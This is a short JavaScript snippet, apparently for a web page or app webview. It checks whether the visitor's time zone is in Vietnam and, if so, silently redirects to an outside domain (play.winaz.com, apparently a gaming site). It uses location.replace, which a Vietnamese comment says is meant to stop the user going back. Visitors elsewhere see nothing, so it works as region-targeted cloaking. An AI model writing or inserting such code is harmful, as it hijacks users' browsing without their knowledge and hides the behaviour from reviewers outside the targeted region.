(function () {
  if (typeof window === "undefined" || typeof Intl === "undefined") return;

  const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "";

  if (userTimeZone === "Asia/Ho_Chi_Minh" || userTimeZone === "Asia/Saigon") {
    // if (window.AndroidOrientation?.lockLandscape) {
    //   window.AndroidOrientation.lockLandscape();
    // }
    const to = "https://play.winaz.com/";
    window.location.replace(to); // dùng replace để tránh quay lại trang trước
  }
  // else {
  //   if (window.AndroidOrientation?.lockPortrait) {
  //     window.AndroidOrientation.lockPortrait();
  //   }
  // }
})();
